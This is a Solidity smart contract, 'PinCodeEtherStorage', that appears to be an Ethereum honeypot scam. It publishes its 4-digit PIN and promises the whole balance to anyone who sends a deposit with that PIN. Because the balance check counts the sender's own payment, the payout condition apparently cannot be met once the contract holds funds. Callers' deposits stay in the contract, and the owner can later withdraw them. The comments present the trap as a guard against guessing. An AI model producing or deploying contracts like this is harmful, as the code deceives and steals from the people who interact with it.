pragma solidity ^0.4.19;
contract PinCodeEtherStorage {
	// Store some money with a 4 digit code
	
    address private Owner = msg.sender;
    uint public PinCode = 2658;

    function() public payable {}
    function PinCodeEtherStorage() public payable {}
   
    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Take(uint n) public payable {
		if(msg.value &gt;= this.balance &amp;&amp; msg.value &gt; 0.1 ether)
			// To prevent random guesses, you have to send some money
			// Random Guess = money lost
			if(n &lt;= 9999 &amp;&amp; n == PinCode)
				msg.sender.transfer(this.balance+msg.value);
    }
}